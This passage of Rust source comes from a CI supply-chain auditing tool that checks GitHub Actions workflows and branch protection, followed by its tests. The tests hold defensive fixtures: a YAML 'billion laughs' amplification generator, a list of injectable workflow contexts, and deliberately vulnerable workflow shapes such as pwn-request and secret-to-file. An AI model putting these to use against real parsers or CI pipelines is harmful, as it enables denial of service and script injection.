                .is_some_and(|e| e == "yml" || e == "yaml")
        })
        .collect();
    entries.sort();
    for path in entries {
        let rel = format!(
            ".github/workflows/{}",
            path.file_name().unwrap_or_default().to_string_lossy()
        );
        let content = std::fs::read_to_string(&path)?;
        match audit_workflow(&rel, &content, extended) {
            Ok(f) => findings.extend(f),
            Err(err) => findings.push(Finding::new(
                Severity::Error,
                &rel,
                format!("unparseable workflow: {err:#}"),
            )),
        }
    }
    // Also audit local composite actions the workflows `uses: ./...`. Their
    // internal `uses:` refs must be pinned just like a workflow's.
    findings.extend(audit_local_actions(ctx)?);
    Ok(findings)
}

/// Audit every `.github/actions/<name>/action.yml` (or `.yaml`) in the repo.
fn audit_local_actions(ctx: &Ctx) -> Result<Vec<Finding>> {
    let actions_dir = ctx.root.join(".github").join("actions");
    let mut findings = Vec::new();
    if !actions_dir.is_dir() {
        return Ok(findings);
    }
    let mut dirs: Vec<_> = std::fs::read_dir(&actions_dir)?
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| p.is_dir())
        .collect();
    dirs.sort();
    for d in dirs {
        for fname in ["action.yml", "action.yaml"] {
            let path = d.join(fname);
            if !path.is_file() {
                continue;
            }
            let rel = format!(
                ".github/actions/{}/{fname}",
                d.file_name().unwrap_or_default().to_string_lossy()
            );
            let content = std::fs::read_to_string(&path)?;
            match audit_action_file(&rel, &content) {
                Ok(f) => findings.extend(f),
                Err(err) => findings.push(Finding::new(
                    Severity::Error,
                    &rel,
                    format!("unparseable action: {err:#}"),
                )),
            }
        }
    }
    Ok(findings)
}

pub fn verify_actions_control(ctx: &Ctx, extended: bool) -> VerifyResult {
    let id: &'static str = if extended {
        "workflow-audit-extended"
    } else {
        "actions-audit"
    };
    match audit_repo(ctx, extended) {
        Err(err) => VerifyResult::new(id, Outcome::Fail, vec![format!("audit failed: {err:#}")]),
        Ok(findings) => {
            if findings.is_empty() {
                let dir = ctx.root.join(".github").join("workflows");
                let msg = if dir.is_dir() {
                    "all workflows pass (SHA-pinned, least-privilege)".to_string()
                } else {
                    "no .github/workflows directory — nothing to audit yet".to_string()
                };
                return VerifyResult::new(id, Outcome::Pass, vec![msg]);
            }
            let errors = findings
                .iter()
                .filter(|f| f.severity == Severity::Error)
                .count();
            let outcome = if errors > 0 {
                Outcome::Fail
            } else {
                Outcome::Pass
            };
            let messages = findings
                .iter()
                .map(|f| {
                    format!(
                        "[{}] {}: {}",
                        match f.severity {
                            Severity::Error => "ERROR",
                            Severity::Warn => "warn",
                            Severity::Info => "info",
                        },
                        f.file,
                        f.message
                    )
                })
                .collect();
            VerifyResult::new(id, outcome, messages)
        }
    }
}

/// Translate the classic branch-protection object
/// (`GET /repos/{o}/{r}/branches/{b}/protection`) into the rule shapes the
/// rulesets API returns, so one set of rule checks below scores both
/// mechanisms. The rulesets API answers `[]` for a branch protected ONLY the
/// classic way (proven live 2026-09-05 on a throwaway repo with required
/// reviews, admin enforcement and force-push/deletion blocks all active), so
/// without this read a whole class of protected repositories scored as
/// unprotected — worse than OpenSSF Scorecard, which reads both.
fn classic_protection_as_rules(classic: &serde_json::Value) -> Vec<serde_json::Value> {
    use serde_json::json;
    let enabled = |k: &str| classic[k]["enabled"].as_bool().unwrap_or(false);
    let mut rules = Vec::new();
    if let Some(pr) = classic.get("required_pull_request_reviews") {
        rules.push(json!({
            "type": "pull_request",
            "parameters": {
                "dismiss_stale_reviews_on_push": pr["dismiss_stale_reviews"].as_bool().unwrap_or(false),
                "require_code_owner_review": pr["require_code_owner_reviews"].as_bool().unwrap_or(false),
                "require_last_push_approval": pr["require_last_push_approval"].as_bool().unwrap_or(false),
                "required_approving_review_count": pr["required_approving_review_count"].as_u64().unwrap_or(0),
            }
        }));
    }
    // Classic protection blocks force-pushes and deletions unless the
    // corresponding `allow_*` toggle is on; absent means blocked.
    if !enabled("allow_force_pushes") {
        rules.push(json!({"type": "non_fast_forward"}));
    }
    if !enabled("allow_deletions") {
        rules.push(json!({"type": "deletion"}));
    }
    if enabled("required_signatures") {
        rules.push(json!({"type": "required_signatures"}));
    }
    if let Some(checks) = classic.get("required_status_checks") {
        rules.push(json!({
            "type": "required_status_checks",
            "parameters": {
                "strict_required_status_checks_policy": checks["strict"].as_bool().unwrap_or(false),
            }
        }));
    }
    rules
}

/// Verify GitHub branch protection. Three reads, in order, per branch:
///
/// 1. the rulesets API (`rules/branches/{b}`) — rulesets-protected branches;
/// 2. when that answers `[]`, the classic endpoint
///    (`branches/{b}/protection`) — classic-protected branches, translated by
///    [`classic_protection_as_rules`]; it needs an admin token and answers
///    403/404 to anyone else;
/// 3. when that too is refused, the public branch record (`branches/{b}`),
///    whose `protected` flag any token can read — `true` means protection
///    exists but its settings are unreadable here (Degraded, never Pass on a
///    flag alone), `false` means the branch is genuinely unprotected (Fail).
pub fn verify_branch_protection(ctx: &Ctx, cfg: &Config) -> VerifyResult {
    let id = "branch-protection";
    if crate::exec::find_in_path("gh").is_none() {
        return VerifyResult::new(
            id,
            Outcome::Degraded,
            vec![crate::tools::degrade_message("gh", ctx.platform)],
        );
    }
    let Some(slug) = cfg.github_repo().or_else(|| ctx.origin_slug()) else {
        return VerifyResult::new(
            id,
            Outcome::Degraded,
            vec![
                "no GitHub repo configured (general.github_repo) and no origin remote — \
                 cannot verify branch protection"
                    .into(),
            ],
        );
    };
    let branches = cfg.protected_branches();
    if branches.is_empty() {
        return VerifyResult::new(
            id,
            Outcome::Degraded,
            vec![
                "no protected branches configured (general.protected_branches) — \
                 there is nothing to verify, which is not the same as being protected"
                    .into(),
            ],
        );
    }
    let mut messages = Vec::new();
    let mut outcome = Outcome::Pass;
    // How many branches the rules API actually answered for. A branch that
    // could not be queried proves nothing about its protection, so if NOT ONE
    // was answered the control verified nothing at all — see the Degraded
    // return below.
    let mut answered = 0usize;
    // Branches the public record says are protected but whose settings no
    // read here could see (non-admin token). Protection exists; its shape is
    // unverified — that holds the whole control at Degraded, never Pass.
    let mut protected_unreadable = 0usize;
    let gh = |api: &str| exec::run("gh", &["api", api], Some(&ctx.root));
    for branch in &branches {
        let api = format!("repos/{slug}/rules/branches/{branch}");
        let out = match gh(&api) {
            Ok(o) => o,
            Err(err) => {
                return VerifyResult::new(
                    id,
                    Outcome::Degraded,
                    vec![format!("gh failed: {err:#}")],
                )
            }
        };
        if !out.success() {
            messages.push(format!(
                "{branch}: could not query rules API ({}) — branch may not exist on the remote",
                out.stderr.lines().next().unwrap_or("error")
            ));
            continue;
        }
        let mut rules: Vec<serde_json::Value> =
            serde_json::from_str(&out.stdout).unwrap_or_default();
        // Rulesets answering directly is one way a branch counts as read; the
        // classic and public-record arms below count themselves.
        let rulesets_answered = !rules.is_empty();
        if rules.is_empty() {
            // Read 2: classic protection. Admin-only; 403/404 otherwise.
            let classic_api = format!("repos/{slug}/branches/{branch}/protection");
            let classic = match gh(&classic_api) {
                Ok(o) => o,
                Err(err) => {
                    return VerifyResult::new(
                        id,
                        Outcome::Degraded,
                        vec![format!("gh failed: {err:#}")],
                    )
                }
            };
            if classic.success() {
                let obj: serde_json::Value =
                    serde_json::from_str(&classic.stdout).unwrap_or_default();
                rules = classic_protection_as_rules(&obj);
                answered += 1;
                messages.push(format!(
                    "{branch}: no rulesets — read via classic branch protection"
                ));
            } else {
                // Read 3: the public branch record's `protected` flag.
                let status = classic.stderr.lines().next().unwrap_or("error").to_string();
                let branch_api = format!("repos/{slug}/branches/{branch}");
                let record = match gh(&branch_api) {
                    Ok(o) if o.success() => o,
                    _ => {
                        messages.push(format!(
                            "{branch}: no rulesets, classic protection endpoint answered \
                             `{status}`, and the branch record could not be read — protection \
                             unverified"
                        ));
                        answered += 1;
                        protected_unreadable += 1;
                        continue;
                    }
                };
                let flag: serde_json::Value =
                    serde_json::from_str(&record.stdout).unwrap_or_default();
                // GitHub answers a missing branch name with the DEFAULT branch's
                // record (a followed redirect), so `protected` here would
                // describe a different branch. Trust the flag only when the
                // record names the branch that was asked for; otherwise the
                // branch does not exist on the remote and nothing was verified.
                let named = flag["name"].as_str().unwrap_or_default();
                if named != branch.as_str() {
                    messages.push(format!(
                        "{branch}: not found on the remote (the branch record answered for \
                         `{named}` instead) — nothing verified for this name"
                    ));
                    continue;
                }
                answered += 1;
                if flag["protected"].as_bool().unwrap_or(false) {
                    messages.push(format!(
                        "{branch}: no rulesets and the classic protection endpoint answered \
                         `{status}` — the public branch record reports `protected: true`, so \
                         protection exists but its settings need an admin token to read; \
                         UNVERIFIED, not confirmed"
                    ));
                    protected_unreadable += 1;
                    continue;
                }
                messages.push(format!(
                    "{branch}: no rulesets, classic protection endpoint answered `{status}`, \
                     public branch record reports `protected: false`"
                ));
            }
        }
        if rulesets_answered {
            answered += 1;
        }
        let active: Vec<&str> = rules
            .iter()
            .filter_map(|r| r.get("type").and_then(|t| t.as_str()))
            .collect();
        let mut gaps = Vec::new();
        for (rule, label, remediation) in [
            (
                "pull_request",
                "required pull requests",
                "add a ruleset requiring PRs before merging",
            ),
            (
                "non_fast_forward",
                "force-push blocking",
                "enable 'Block force pushes'",
            ),
            (
                "required_signatures",
                "required signed commits",
                "enable 'Require signed commits'",
            ),
            (
                "required_status_checks",
                "required status checks",
                "require your CI checks before merge",
            ),
        ] {
            if active.contains(&rule) {
                messages.push(format!("{branch}: {label} ✓"));
            } else {
                gaps.push(format!("{branch}: MISSING {label} — {remediation}"));
            }
        }
        if active.contains(&"deletion") {
            messages.push(format!("{branch}: deletion protection ✓"));
        }

        // OpenSSF Scorecard "Branch-Protection" alignment: the rule-type checks
        // above only prove a rule EXISTS; Scorecard scores the granular
        // parameters. Surface each so `sscsb verify` mirrors what Scorecard sees.
        // Two tiers: knobs a SOLO maintainer can safely set, and knobs that
        // structurally require a SECOND reviewer (a solo owner cannot
        // self-approve without deadlocking their own merges — enabling those
        // would lock the owner out, so we report, never silently fail, on them).
        let rule_params = |ty: &str| -> Option<&serde_json::Value> {
            rules
                .iter()
                .find(|r| r.get("type").and_then(|t| t.as_str()) == Some(ty))
                .and_then(|r| r.get("parameters"))
        };
        if let Some(p) = rule_params("pull_request") {
            let flag = |k: &str| p.get(k).and_then(|v| v.as_bool()).unwrap_or(false);
            let approvals = p
                .get("required_approving_review_count")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);

            // Solo-safe: dismissing stale approvals is a no-op when 0 approvals
            // are required, so it never blocks a solo owner — `harden` sets it.
            if flag("dismiss_stale_reviews_on_push") {
                messages.push(format!("{branch}: Scorecard — stale-review dismissal ✓"));
            } else {
                messages.push(format!(
                    "{branch}: Scorecard gap — stale-review dismissal off \
                     (solo-safe; fix: `sscsb harden branch-protection --apply`)"
                ));
            }

            // Second-reviewer tier — solo-capped.
            for (ok, label) in [
                (approvals >= 1, "≥1 required approving review"),
                (flag("require_code_owner_review"), "code-owner review"),
                (flag("require_last_push_approval"), "last-push approval"),
            ] {
                if ok {
                    messages.push(format!("{branch}: Scorecard — {label} ✓"));
                } else {
                    messages.push(format!(
                        "{branch}: Scorecard gap — {label} off (needs a 2nd reviewer; a \
                         solo maintainer cannot self-approve — opt in with \
                         `sscsb harden branch-protection --require-reviews` once you have one)"
                    ));
                }
            }
        }
        if let Some(p) = rule_params("required_status_checks") {
            if p.get("strict_required_status_checks_policy")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
            {
                messages.push(format!(
                    "{branch}: Scorecard — branch-up-to-date (strict) ✓"
                ));
            } else {
                messages.push(format!(
                    "{branch}: Scorecard gap — status checks not strict \
                     (solo-safe; fix: `sscsb harden branch-protection --apply`)"
                ));
            }
        }

        if !gaps.is_empty() {
            outcome = Outcome::Fail;
            messages.extend(gaps);
        }
    }
    // Not one protected branch could be read: every rule check above was
    // skipped, so nothing was verified. "I could not check" is DEGRADED, never
    // PASS — a green branch-protection line here would be pure fiction.
    if answered == 0 {
        messages.push(format!(
            "NOTHING VERIFIED: the rules API answered for 0 of {} configured protected \
             branch(es) — branch protection is unverified, not confirmed",
            branches.len()
        ));
        return VerifyResult::new(id, Outcome::Degraded, messages);
    }
    // A branch whose protection exists but could not be read pulls a would-be
    // Pass down to Degraded; a real gap elsewhere still wins as Fail.
    if outcome == Outcome::Pass && protected_unreadable > 0 {
        messages.push(format!(
            "{protected_unreadable} protected branch(es) could not be read with this token — \
             an admin token (or a ruleset, which any token can read) makes this verifiable"
        ));
        return VerifyResult::new(id, Outcome::Degraded, messages);
    }
    VerifyResult::new(id, outcome, messages)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::Ctx;

    /// A YAML alias/anchor amplification document. `levels` three-line
    /// anchors, each aliasing the previous TWICE, so the expanded structure
    /// is 2^levels nodes from a source document a few bytes longer per
    /// level — and `2 * levels + 1` anchor/alias TOKENS, which is the count
    /// [`refuse_yaml_amplification_shape`] actually measures.
    fn billion_laughs(levels: u32) -> String {
        let mut doc = String::from("a0: &a0 [\"x\"]\n");
        for i in 1..levels {
            doc.push_str(&format!("a{i}: &a{i} [*a{prev}, *a{prev}]\n", prev = i - 1));
        }
        doc.push_str(&format!("final: *a{}\n", levels - 1));
        doc
    }

    #[test]
    fn count_anchor_alias_tokens_counts_declarations_and_references() {
        // Hand-verified (and cross-checked with an independent Python
        // simulation of the same scan): "a0" declares 1 (&a0); the loop for
        // i in 1..4 (3 iterations) each adds 1 declaration + 2 references =
        // 3 tokens × 3 = 9; the trailing `final: *a3` adds 1 more. Total 11.
        // In general billion_laughs(L) carries exactly 3L - 1 tokens.
        let doc = billion_laughs(4);
        assert_eq!(count_anchor_alias_tokens(&doc), 11, "{doc}");
    }

    #[test]
    fn the_token_scan_does_not_false_positive_on_ordinary_shell_and_expressions() {
        // The false-positive resistance the doc comment on
        // count_anchor_alias_tokens claims, checked against the actual
        // shapes real workflow steps use: `ls *.txt`'s `*` is followed by
        // `.`, not a name character, so it never completes a token;
        // `some-server &`'s `&` has nothing after it on the line; `'*'`'s
        // `*` is preceded by a quote, which is not a value-start boundary
        // at all, so it is never even considered a candidate.
        let doc = r#"
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ls *.txt
      - run: some-server &
      - run: echo "a & b, c * d"
      - if: contains(github.event.head_commit.message, '*')
"#;
        assert_eq!(
            count_anchor_alias_tokens(doc),
            0,
            "none of these are real YAML anchors or aliases"
        );
    }

    #[test]
    fn a_billion_laughs_document_is_refused_before_it_ever_reaches_the_parser() {
        // The real fix (issue #43): the anchor/alias count check runs BEFORE
        // yaml-rust2 sees the bytes at all, so this must return in
        // microseconds regardless of level count — 40 levels would still be
        // an exponential blowup if actually parsed, but it never gets that
        // far. No custom budget needed any more; the default path is already
        // fast because parsing never starts.
        let doc = billion_laughs(40);
        let t = std::time::Instant::now();
        let err = parse_workflow_yaml(&doc).unwrap_err();
        assert!(
            t.elapsed() < Duration::from_millis(100),
            "the check must reject before parsing, not after: took {:?}",
            t.elapsed()
        );
        let msg = format!("{err:#}");
        assert!(
            msg.contains("refused before parsing"),
            "must be named a pre-parse refusal: {msg}"
        );
        assert!(
            msg.contains("119"),
            "must report the real count (3*40-1): {msg}"
        );
    }

    #[test]
    fn the_limit_is_a_real_boundary_not_a_decoration() {
        // billion_laughs(5) carries 3*5-1 = 14 tokens (under the limit of
        // 16); billion_laughs(6) carries 3*6-1 = 17 (one over) — the
        // smallest step this generator can take across the boundary, so
        // this is a genuine off-by-one proof, not a generous margin. Proves
        // the constant is load-bearing rather than a number nothing checks.
        let under = billion_laughs(5);
        assert_eq!(count_anchor_alias_tokens(&under), 14);
        assert!(refuse_yaml_amplification_shape(&under).is_ok());

        let over = billion_laughs(6);
        assert_eq!(count_anchor_alias_tokens(&over), 17);
        assert!(refuse_yaml_amplification_shape(&over).is_err());
    }

    #[test]
    fn ordinary_workflow_yaml_passes_both_checks() {
        // The negative control: a real (if tiny) workflow document must not
        // be mistaken for the attack shape either check guards against.
        let doc = "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n";
        let docs = parse_workflow_yaml(doc).expect("an ordinary document must not be refused");
        assert_eq!(docs.len(), 1);
    }

    #[test]
    fn the_cpu_backstop_mechanism_genuinely_fires_when_a_budget_is_exceeded() {
        // Proves the SECOND, separate layer — the timeout wrapper — actually
        // triggers. Exercises `run_with_timeout` directly with a workload
        // whose duration the test fully controls (a 500ms sleep against a
        // 5ms budget — a 100x margin), rather than racing a real YAML parse
        // of trivial content against a zero-duration budget: a real CI run
        // proved that construction was a genuine race, not a deterministic
        // proof — a machine fast enough to complete the spawn-parse-send
        // round trip before the main thread's very next instruction makes
        // `recv_timeout(Duration::ZERO)` a coin flip, and one such runner
        // called it heads. Controlling the workload's duration directly
        // removes the dependency on how fast any given machine happens to
        // parse a few dozen bytes of YAML. Documents the honest limit stated
        // in YAML_PARSE_BUDGET's doc comment: this layer does not currently
        // have a live attack it alone defends against — it is
        // defense-in-depth for a shape not yet measured.
        let err = run_with_timeout(Duration::from_millis(5), || {
            std::thread::sleep(Duration::from_millis(500));
            42
        })
        .unwrap_err();
        assert!(format!("{err:#}").contains("did not finish within"));
    }

    #[test]
    fn audit_workflow_reports_the_pre_parse_refusal_rather_than_hanging() {
        // The end-to-end path a real `.github/workflows/*.yml` takes,
        // through the public entry point — not just the bounded helper in
        // isolation.
        let doc = billion_laughs(40);
        let err = audit_workflow("evil.yml", &doc, true).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("evil.yml"), "must name the file: {msg}");
        assert!(msg.contains("refused before parsing"), "{msg}");
    }

    /// Throwaway repo bootstrapped through the real `sscsb init` path —
    /// mirrors the pattern in `tests/library.rs` so audit-control tests run
    /// against the same layout a user gets.
    fn repo() -> (tempfile::TempDir, Ctx) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        crate::exec::git(&["init", "-b", "main"], root).unwrap();
        crate::exec::git(&["config", "user.name", "SSCSB Test"], root).unwrap();
        crate::exec::git(&["config", "user.email", "sscsb-test@example.com"], root).unwrap();
        crate::init::bootstrap(root).expect("bootstrap");
        let ctx = Ctx::discover(root).expect("discover");
        (dir, ctx)
    }

    /// Serializes tests that temporarily prepend a fake `gh` onto PATH.
    /// Nothing else in this crate's test suite shells out to `gh`, so a
    /// prepend-only mutation (never removing existing PATH entries) cannot
    /// affect any other test's tool resolution — this lock only protects our
    /// own PATH-touching tests from racing each other.
    // Shared across modules (audit/harden/scorecard) so PATH-touching gh-stub
    // tests never run concurrently and race on $PATH.
    use crate::testutil::env_lock;

    // The `gh` shims below are installed with `EnvLock::fake_tool`, which writes
    // an executable POSIX script, puts it first on PATH, and — importantly —
    // keeps the temp dir alive inside the lock. Written as a plain local, the
    // dir dropped BEFORE the lock restored PATH, leaving a window in which PATH
    // named a directory that no longer existed.

    const PINNED_OK: &str = r#"
name: ok
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920
        with:
          egress-policy: audit
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          persist-credentials: false
      - run: cargo build --locked
"#;

    #[test]
    fn clean_pinned_workflow_passes_basic_and_extended() {
        assert!(audit_workflow("ok.yml", PINNED_OK, false)
            .unwrap()
            .is_empty());
        assert!(audit_workflow("ok.yml", PINNED_OK, true)
            .unwrap()
            .is_empty());
    }

    #[test]
    fn mutable_ref_flagged() {
        let wf = "on: push\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f
            .iter()
            .any(|x| x.severity == Severity::Error && x.message.contains("mutable ref")));
    }

    #[test]
    fn slsa_generator_tag_pin_is_sanctioned() {
        let wf = "on: push\npermissions: {}\njobs:\n  p:\n    permissions:\n      id-token: write\n    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.1.0\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f.iter().all(|x| x.severity != Severity::Error), "{f:?}");
        assert!(f.iter().any(|x| x.message.contains("tag-pinned by design")));
    }

    #[test]
    fn missing_permissions_and_write_all_flagged() {
        let wf =
            "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f
            .iter()
            .any(|x| x.message.contains("no `permissions:` block")));

        let wf = "on: push\npermissions: write-all\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f.iter().any(|x| x.message.contains("write-all")));
    }

    #[test]
    fn pwn_request_pattern_is_error() {
        let wf = r#"
on: pull_request_target
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - run: make test
"#;
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(f
            .iter()
            .any(|x| x.severity == Severity::Error && x.message.contains("pwn-request")));
    }

    #[test]
    fn extended_checks_fire() {
        let wf = r#"
on: push
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      - uses: tj-actions/changed-files@aa08304bd477b800d468db44fe10f6c61f7f7b11
      - run: |
          echo "${{ secrets.MY_TOKEN }}" > token.txt
          npm install
"#;
        let f = audit_workflow("w.yml", wf, true).unwrap();
        let msgs: Vec<&str> = f.iter().map(|x| x.message.as_str()).collect();
        assert!(msgs.iter().any(|m| m.contains("persist-credentials")));
        assert!(msgs
            .iter()
            .any(|m| m.contains("step-security/changed-files")));
        assert!(msgs.iter().any(|m| m.contains("secret exposure")));
        assert!(msgs.iter().any(|m| m.contains("npm ci")));
        assert!(msgs.iter().any(|m| m.contains("harden-runner")));
    }

    #[test]
    fn empty_workflow_yaml_is_flagged_as_empty_not_parsed() {
        let f = audit_workflow("empty.yml", "", false).unwrap();
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Warn);
        assert!(f[0].message.contains("empty workflow file"));
    }

    #[test]
    fn workflow_with_no_jobs_key_has_nothing_to_walk() {
        // No `jobs:` at all — jobs()/all_uses() must degrade to empty rather
        // than treat the document as malformed. Top-level permissions are
        // present so the missing-permissions rule stays out of the way.
        let wf = "on: push\npermissions:\n  contents: read\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(f.is_empty(), "no jobs means nothing to audit: {f:?}");
    }

    #[test]
    fn workflow_with_empty_jobs_map_has_nothing_to_walk() {
        // `jobs:` present but empty — the hash branch of jobs() is entered
        // and the loop runs zero iterations.
        let wf = "on: push\npermissions:\n  contents: read\njobs: {}\n";
        let f = audit_workflow("w.yml", wf, true).unwrap();
        assert!(f.is_empty(), "empty jobs map yields no findings: {f:?}");
    }

    /// ISC-23: a `docker://` ref by tag is flagged like any other floating
    /// `uses:`; a local composite action is still resolved separately; a
    /// digest-pinned image is clean. One finding for the three, not two and
    /// not zero.
    #[test]
    fn docker_uses_refs_are_pinned_like_any_other_and_local_refs_stay_skipped() {
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/local\n      - uses: docker://alpine:3.19\n      - uses: docker://ghcr.io/acme/tool@sha256:1111111111111111111111111111111111111111111111111111111111111111\n      - run: echo hi\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].severity, Severity::Error);
        assert!(f[0].message.contains("docker://alpine:3.19"));
        assert!(f[0].message.contains("@sha256:<digest>"));
    }

    #[test]
    fn uses_without_at_ref_is_flagged_with_no_ref_message() {
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f
            .iter()
            .any(|x| x.severity == Severity::Error && x.message.contains("has no ref")));
    }

    #[test]
    fn job_level_write_all_permissions_flagged() {
        let wf = "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    permissions: write-all\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        let f = audit_workflow("w.yml", wf, false).unwrap();
        assert!(f
            .iter()
            .any(|x| x.message.contains("job `b` uses `permissions: write-all`")));
    }

    fn injection_findings(wf: &str) -> Vec<Finding> {
        audit_workflow("w.yml", wf, true)
            .unwrap()
            .into_iter()
            .filter(|f| f.message.contains("script injection"))
            .collect()
    }

    fn wf_running(run: &str) -> String {
        format!(
            "on: [push, issues]\npermissions:\n  contents: read\njobs:\n  b:\n    \
             runs-on: ubuntu-latest\n    steps:\n      - run: {run}\n"
        )
    }

    /// ISC-16: the namesake Dangerous-Workflow case — an issue title expanded
    /// straight into a shell — is an Error naming the context and the fix.
    /// The same context twice in one step is one finding, not two.
    #[test]
    fn script_injection_flags_issue_title_in_run() {
        let f = injection_findings(&wf_running(
            "echo \"${{ github.event.issue.title }}\" && echo \"${{ github.event.issue.title }}\"",
        ));
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].severity, Severity::Error);
        assert!(f[0].message.contains("job `b`"));
        assert!(f[0].message.contains("${{ github.event.issue.title }}"));
        assert!(f[0].message.contains("env:"));
    }

    /// ISC-17: every context in Scorecard's `untrustedContextPattern` (plus
    /// discussion and blocked_user) fires in a `run:` body, and the identical
    /// context in a `with:` input does not — `with:` is not shell-expanded,
    /// and that is exactly Scorecard's scope too.
    #[test]
    fn script_injection_covers_scorecards_context_set_in_run_only() {
        let contexts = [
            "github.event.issue.title",
            "github.event.issue.body",
            "github.event.pull_request.title",
            "github.event.pull_request.body",
            "github.event.discussion.title",
            "github.event.discussion.body",
            "github.event.comment.body",
            "github.event.review.body",
            "github.event.review_comment.body",
            "github.event.commits[0].message",
            "github.event.commits.*.message",
            "github.event.commits[0].author.name",
            "github.event.commits[1].author.email",
            "github.event.head_commit.message",
            "github.event.head_commit.author.name",
            "github.event.head_commit.author.email",
            "github.event.pages[0].page_name",
            "github.event.blocked_user.login",
            "github.event.pull_request.head.ref",
            "github.event.pull_request.head.label",
            "github.event.pull_request.head.repo.default_branch",
            "github.head_ref",
            "toJSON(github)",
            "toJson( github.event )",
        ];
        for ctx in contexts {
            let f = injection_findings(&wf_running(&format!("echo \"${{{{ {ctx} }}}}\"")));
            assert_eq!(f.len(), 1, "{ctx}: {f:?}");
            assert_eq!(f[0].severity, Severity::Error, "{ctx}");

            let with = format!(
                "on: issues\npermissions:\n  contents: read\njobs:\n  b:\n    \
                 runs-on: ubuntu-latest\n    steps:\n      \
                 - uses: actions/github-script@60a0d83039c74a4a22d5f3b6ac9ecb3b6bc1d55a\n        \
                 with:\n          title: ${{{{ {ctx} }}}}\n      - run: echo ok\n"
            );
            assert!(
                injection_findings(&with).is_empty(),
                "{ctx} in with: must not fire"
            );
        }
    }

    /// ISC-18: the documented fix — the context bound in `env:` and read as
    /// `"$VAR"` — is clean; flagging it would punish the correct pattern.
    #[test]
    fn script_injection_env_indirection_is_clean() {
        let wf = "on: issues\npermissions:\n  contents: read\njobs:\n  b:\n    \
                  runs-on: ubuntu-latest\n    steps:\n      - env:\n          \
                  TITLE: ${{ github.event.issue.title }}\n        run: echo \"$TITLE\"\n";
        assert!(injection_findings(wf).is_empty());
    }

    /// ISC-19: contexts an attacker does not control stay clean, including
    /// the PR head SHA (a hash, not text) beside its injectable siblings.
    #[test]
    fn script_injection_trusted_contexts_are_clean() {
        for ctx in [
            "github.sha",
            "github.repository",
            "github.ref",
            "github.event.number",
            "github.event.pull_request.head.sha",
            "secrets.TOKEN",
            "matrix.os",
            "steps.build.outputs.path",
        ] {
            let f = injection_findings(&wf_running(&format!("echo \"${{{{ {ctx} }}}}\"")));
            assert!(f.is_empty(), "{ctx}: {f:?}");
        }
        // An unterminated expression is not a script — and not a panic.
        assert!(
            injection_findings(&wf_running("echo \"${{ github.event.issue.title\"")).is_empty()
        );
    }

    /// ISC-20's shape: `github.head_ref` in `concurrency.group` (this repo's
    /// own `ci.yml:25`) is a workflow key, not a script, and must not fire.
    #[test]
    fn script_injection_ignores_head_ref_outside_run() {
        let wf = "on: pull_request\npermissions:\n  contents: read\n\
                  concurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}\n  \
                  cancel-in-progress: true\njobs:\n  b:\n    runs-on: ubuntu-latest\n    \
                  steps:\n      - run: echo ok\n";
        assert!(injection_findings(wf).is_empty());
    }

    #[test]
    fn pull_request_target_trigger_detected_in_array_and_map_forms() {
        let array_wf = "on: [push, pull_request_target]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        let f = audit_workflow("array.yml", array_wf, true).unwrap();
        assert!(f.iter().any(|x| x.severity == Severity::Warn
            && x.message.contains("privileged token in the base repo")));

        let map_wf = "on:\n  pull_request_target:\n    types: [opened]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
        let f = audit_workflow("map.yml", map_wf, true).unwrap();
        assert!(f.iter().any(|x| x.severity == Severity::Warn
            && x.message.contains("privileged token in the base repo")));
    }

    #[test]
    fn audit_repo_surfaces_filesystem_errors_not_just_yaml_errors() {
        let (_d, ctx) = repo();
        // A directory masquerading as a workflow file: read_to_string must
        // fail, and that failure must propagate out of audit_repo rather
        // than being silently swallowed.
